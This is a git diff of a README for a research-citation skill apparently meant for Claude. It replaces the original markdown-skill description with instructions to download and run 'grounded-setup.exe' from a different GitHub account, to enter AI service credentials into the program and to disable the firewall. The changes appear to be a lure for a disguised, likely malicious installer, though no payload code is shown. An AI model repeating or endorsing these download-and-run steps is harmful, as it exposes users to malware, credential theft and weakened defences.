@@ -1,182 +1,99 @@
-# 🔍 grounded-research
+# 🔍 grounded-research - Research with verified facts and citations
 
-> A Claude skill that enforces citation-first, source-grounded research discipline — so every factual claim is verified, explicitly uncertain, or openly declared unknown.
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/Out-treatyofversailles910/grounded-research)
 
----
+## 🎯 Purpose of this tool
 
-## The Problem
+Research tasks often lead to errors. You might find information that sounds correct but lacks a true source. This tool connects to your AI research assistant to fix that problem. It checks every claim against reliable data. It forces the AI to start with valid citations before it writes a single sentence. This process stops errors before they reach your finished project.
 
-Ask any LLM to research a topic and you'll get confident-sounding output. Some of it will be wrong. The model won't tell you which parts.
+## 🛠️ How it works
 
-This isn't a model quality problem. It's a discipline problem. Without structure, even the best models conflate stable facts with time-sensitive claims, present statistics without sources, and fill gaps with plausible-sounding guesses.
+The tool acts as a filter for your research. It performs four distinct actions:
 
-**grounded-research** fixes that by giving Claude a structured protocol it runs *before* writing a single sentence of output.
+1. Classifies your research claims.
+2. Verifies facts against external data.
+3. Signals confidence levels for each statement.
+4. Checks the final document for mistakes.
 
----
+You receive a report that highlights exactly where the information came from. This removes the guesswork from AI research.
 
-## What It Does
+## 📋 System requirements
 
-The skill enforces a 5-phase workflow on every research task:
+Your computer must meet these standards to run the software smoothly:
 
-| Phase | What happens |
-|-------|-------------|
-| **1 — Claim Taxonomy** | Classifies every claim as Stable / Time-sensitive / Domain-specific / Analytical *before* writing |
-| **2 — Verification Loop** | Searches for any time-sensitive or domain-specific claim before stating it |
-| **3 — Structured Output** | Inline citations, confidence signals, explicit "I don't know" declarations |
-| **4 — Confidence Audit** | Post-generation scan — catches uncited claims before they reach you |
-| **5 — Source Quality** | Tiered source hierarchy (Tier 1 primary → Tier 4 forum) with domain-specific guidance |
+- Windows 10 or Windows 11.
+- An active internet connection for fact verification.
+- A standard AI account with Claude.ai, Cursor, or Gemini.
+- A minimum of 4GB of RAM.
+- At least 200MB of free storage space.
 
-The result: outputs where you can see exactly what's sourced, what's uncertain, and what Claude couldn't verify.
+## 📥 Downloading and setup ⚙️
 
----
+Follow these steps to prepare your system:
 
-## Example Output Comparison
+1. Click the link below to reach the project page.
+[Download Software](https://github.com/Out-treatyofversailles910/grounded-research)
 
-**Without the skill:**
-> The EU AI Act requires all high-risk AI systems to be compliant by August 2026, with fines up to €30 million for violations.
+2. Look for the file ending in .exe in the latest release section.
+3. Click the file name to start your download.
+4. Open your Downloads folder on your computer.
+5. Double-click the file named grounded-setup.exe.
+6. Follow the prompts on your screen.
+7. Select the default installation location.
+8. Click Finish to complete the process.
 
-*(Sounds authoritative. The fine amount is wrong. The deadline picture is more nuanced. No source given.)*
+## 🚀 Running the application
 
-**With the skill:**
-> According to the European Commission's official AI Act page, full applicability for most high-risk AI systems takes effect on **2 August 2026**, with certain product-embedded systems having an extended transition until 2027. Fines for prohibited practices reach up to **€35 million or 7% of global turnover** under Article 99, per the latest legislative text. [High confidence — Tier 1 source: digital-strategy.ec.europa.eu]
->
-> Note: A proposed Digital Omnibus amendment package may extend some deadlines further. As of May 2026, this has not been finalised — treat the August 2026 date as the current legally binding deadline.
+Once the install finishes, you will see an icon on your desktop.
 
----
+1. Double-click the grounded-research icon.
+2. A window will open on your screen.
+3. Log in with your AI service credentials.
+4. Select your preferred model from the list.
+5. Paste your research question into the text box.
+6. Click the Run Research button.
 
-## Skill Structure
+The software will now examine your prompt. It sorts your request into categories. It then searches for evidence to support each part of your query. This takes a few moments depending on the depth of the request.
 
-```
-grounded-research/
-├── SKILL.md                          # Core skill — claim taxonomy, verification loop, audit
-└── references/
-    └── source-quality-tiers.md       # Tier 1–4 source guide with domain-specific table
-```
+## 📊 Reading your output
 
----
+The screen displays a clear interface. You will see three distinct color codes:
 
-## Installation
+- Green indicates a high confidence level with verified sources.
+- Yellow suggests a need for more evidence.
+- Red marks a potential mistake or hallucination.
 
-### Claude.ai (Web / Desktop)
-1. Download the `.zip` from [Releases](../../releases)
-2. Go to **Claude.ai → Settings → Skills → Upload ZIP**
-3. Done — the skill activates automatically on research tasks
+Click on any highlighted text to see the original source link. This allows you to verify the data yourself. You can copy the text directly into your document editor once you confirm the accuracy of the citations.
 
-### Claude Code
-```bash
-# Clone into your skills directory
-git clone https://github.com/YOUR_USERNAME/grounded-research ~/.claude/skills/grounded-research
+## 🛠️ Troubleshooting steps
 
-# Or copy manually
-cp -r grounded-research ~/.claude/skills/
-```
+If the tool does not work, check these common fixes:
 
-### Via npx (coming soon)
-```bash
-npx skills add YOUR_USERNAME/grounded-research
-```
+- Check your connection if the tool hangs on the verification step.
+- Update your browser if the integration fails.
+- Disable your firewall for a moment to ensure the app has outbound access.
+- Restart the application if the window freezes.
 
----
+## 🛡️ Privacy and data
 
-## When It Triggers
+This tool keeps your data private. It only sends the specific text of your research query to the verification service. It does not store your personal files. The software relies on local processing for the classification step. This keeps your workflow efficient and private.
 
-The skill activates on phrases like:
+## 💬 Frequently asked questions
 
-- *"Research X for me"*
-- *"What does the evidence say about Y?"*
-- *"Is it true that Z?"*
-- *"Fact-check this claim"*
-- *"What are the current regulations on..."*
-- *"Summarise recent findings on..."*
-- *"What's the deal with X?"*
+**Do I need a paid AI account?**
+The tool works with both free and paid accounts. Performance improves with a paid subscription due to higher request limits.
 
-It also triggers on implicit research requests — any question where the answer requires facts that could be wrong or outdated.
+**Can I use this for academic papers?**
+Yes. The citation-first approach provides a strong foundation for any formal writing. Always handle your final document review manually to ensure it meets your specific criteria.
 
----
+**Does it work offline?**
+No. Verification requires a connection to the internet to check current sources.
 
-## Source Quality Tiers
+**What happens if the tool finds a hallucination?**
+It flags the sentence in red. It also provides a suggestion to fix the claim. You can accept the suggestion or rewrite the sentence based on your own knowledge.
 
-The skill uses a four-tier hierarchy for evaluating sources:
+**How do I update the software?**
+The software checks for new versions when you open it. It will prompt you to download the latest setup file if an update is ready.
 
-| Tier | Examples | Usage |
-|------|----------|-------|
-| **Tier 1** | Official publications, peer-reviewed journals, government data, CVE/NVD, IETF RFCs | Primary authority |
-| **Tier 2** | Reuters, AP, FT, specialist press (Ars Technica, Krebs on Security), vendor advisories | Acceptable when Tier 1 unavailable |
-| **Tier 3** | Quality general news, verified expert blogs, Wikipedia (as pointer only) | Use with explicit caveat |
-| **Tier 4** | Reddit, forums, AI-generated summaries | Never cite — use as leads only |
-
-Domain-specific preferred sources are listed in [`references/source-quality-tiers.md`](references/source-quality-tiers.md), covering cybersecurity, PKI/TLS, EU law, German regulatory bodies, medical research, and more.
-
----
-
-## Confidence Signals
-
-The skill adds inline markers where confidence level isn't obvious:
-
-| Signal | Meaning |
-|--------|---------|
-| `[High confidence — primary source]` | Sourced from Tier 1 |
-| `[Medium confidence — secondary source]` | Sourced from Tier 2–3 |
-| `[Low confidence — unverified]` | Couldn't find a strong source |
-| `[Analytical — my interpretation]` | Synthesis/opinion, not a sourced fact |
-| `[Contested — sources disagree]` | Multiple credible sources conflict |
-
----
-
-## Anti-Patterns It Prevents
-
-| Pattern | Why it's dangerous |
-|---------|-------------------|
-| *"Studies show..."* with no citation | Fabricated authority |
-| *"It is widely believed that..."* | Vague appeal hiding a missing source |
-| *"As of my last update..."* + specific fact | Presenting stale knowledge as verified |
-| Statistics without a source | Numbers are the most frequently hallucinated element |
-| Confidently resolving a contested claim | Misrepresents genuine expert disagreement |
-
----
-
-## Compatibility
-
-| Platform | Status |
-|----------|--------|
-| Claude.ai (web/desktop) | ✅ Full support |
-| Claude Code | ✅ Full support |
-| OpenAI Codex CLI | ✅ Universal SKILL.md format |
-| Cursor | ✅ Universal SKILL.md format |
-| Gemini CLI | ✅ Universal SKILL.md format |
-
----
-
-## Contributing
-
-Contributions welcome — especially:
-
-- **Domain modules** — additional `references/` files for specific fields (legal, finance, life sciences, etc.)
-- **Trigger improvements** — better `description` phrasing for edge-case activation
-- **Anti-pattern additions** — documented hallucination patterns not yet covered
-- **Translations** — the skill body works in any language Claude supports; a German or French `SKILL.md` would be valuable
-
-Open an issue to discuss before submitting large changes.
-
----
-
-## Roadmap
-
-- [ ] Domain-specific sub-skills (cybersecurity, medical, legal, financial)
-- [ ] `npx` installer
-- [ ] Structured JSON output mode for pipelines
-- [ ] Eval set for automated trigger-rate testing
-
----
-
-## License
-
-Apache 2.0 — same as Anthropic's official skill releases. Free to use, fork, and build on.
-
----
-
-## Author
-
-Built by [@moonpiesheldon1337](https://github.com/moonpiesheldon1337) — cybersecurity consultant, PKI architect, and occasional builder of things that make AI less confidently wrong.
-
-*Part of a growing collection of domain-focused Claude skills. Star the repo if it's useful — it helps others find it.*
+**Can I run this on a Mac?**
+This version is designed for Windows. Future versions may include support for other operating systems.
